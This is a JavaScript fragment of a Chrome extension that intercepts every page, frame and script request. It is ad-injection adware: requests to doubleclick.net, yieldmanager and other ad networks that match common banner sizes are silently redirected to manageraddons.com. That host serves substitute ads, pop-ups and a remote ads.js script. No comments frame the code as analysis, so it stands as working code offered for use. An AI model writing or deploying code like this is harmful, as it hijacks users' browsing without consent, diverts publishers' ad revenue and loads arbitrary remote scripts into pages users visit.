chrome.webRequest.onBeforeRequest.addListener(
        function(details) {

            var ad_url = false;
            var uri = details.url;

            if ((/(STIVEKNOXX_419|2893753|3595530|boo-box|manageraddons|DFASITE)/i).test(uri))
                return;

            if (details.type == "script")
            {
                if ((/ad\.yieldmanager\.com/i).test(uri) && (matchs = (uri.toLowerCase()).match(/(300x250|250x250|728x90|336x280|720x300|720x480|160x600|468x60|120x600)/i))) {
                    ad_url = 'http://manageraddons.com/ads.js.php?src=OMChrome1.2.9';
                }
            } else {
                //Only Ads serving on doubleclick.net
                if ((/doubleclick\.net/i).test(uri)) {
                    if ((match1 = (uri).match(/h=(\d+)/i)) && (match2 = (uri).match(/w=(\d+)/i))) {
                        uri = match2[1] + "x" + match1[1];
                    }
                    if (matchs = (uri).match(/(300x250|250x250|728x90|336x280|720x300|720x480|160x600|468x60|120x600)/i)) {
                        ad_url = 'http://manageraddons.com/adsalt/' + matchs[0] + '/?nopop&utm_source=OMChrome3&v=1.2.9';
                    } else if ((/com\.ythome/i).test(uri)) {
                        ad_url = 'http://manageraddons.com/adsalt/728x90/?nopop&utm_source=OMChrome3';
                    }
                    //Here we replace in various ad system
                } else if ((/(clkads\.com\/(adServe|banners)|ads\.adperium\.com|tagmanezt\.terra\.com|adserving\.cpxinteractive\.com|ad\.yieldmanager\.com)/i).test(uri)) {
                    if ((match1 = (uri).match(/h=(\d+)/i)) && (match2 = (uri).match(/w=(\d+)/i))) {
                        uri = match2[1] + "x" + match1[1];
                    }
                    if (matchs = (uri.toLowerCase()).match(/(300x250|250x250|728x90|336x280|720x300|720x480|160x600|468x60|120x600)/i)) {
                        ad_url = 'http://manageraddons.com/adsalt/' + matchs[0] + '/?pop=1&utm_source=OMChrome3';
                    }
                }
            }
            if (ad_url) {
                return {
                    redirectUrl: ad_url
                };
            }
        },
        {
            urls: ["<all_urls>"],
            types: ["main_frame", "sub_frame", "script"]
        },
["blocking"]); 